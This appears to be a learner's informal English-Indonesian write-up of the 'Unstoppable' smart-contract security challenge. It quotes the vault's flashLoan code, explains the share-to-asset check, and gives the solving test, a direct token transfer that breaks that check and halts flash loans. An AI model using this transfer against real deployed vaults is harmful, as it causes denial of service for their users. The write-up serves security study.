# Unstoppable Notes(wrote by myself)
- related files: src/Unstoppable.sol,test/Unstoppable.t.sol
---
### 1. Bug = manage to make the flash loan stop
---

### 2. where? = UnstoppableVault.sol:96

### 3. leaks reason?
- @ src/UnstoppableVault.sol ada 1 function flash loan(ini core idea dari contract ini)
```
    function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);

        // callback must return magic value, otherwise assume it failed
        uint256 fee = flashFee(_token, amount);
        if (
            receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
                != keccak256("IERC3156FlashBorrower.onFlashLoan")
        ) {
            revert CallbackFailed();
        }

        // pull amount + fee from receiver, then pay the fee to the recipient
        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);

        return true;
    }

```

-  ada 3 syarat utk tx bs di anggap lolos
- 2 dari 3 syarat itu easy to slip u cm hrus sesuai syarat  dan its compltely done
- but 1 last syarat ini ksh tau kalo ratio tuker barang sama tiket buat tuker barang ini hrus sm,contoh :ad tmpt ttip helm each helm yg di titip dpet 1 tiket kalo tibha tiba tiba ada 1 tiket lebih otomatis tmpt ttip helm itu bingung-rusak same shit applies ke contract inii,dia gk pedli mau di ksh brp value input brp dia dh keburu nolak dl kek kenapa ada brg lebih

### 4. how we breach it :
- straight tf token ke contract pake starting token yg challenge provider ksh ke kita.
``` solidity
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 10e18);
    }
```

### 5. related shit (bonus) :
 Real-world   Cream Finance ~$130M kena pattern mirip
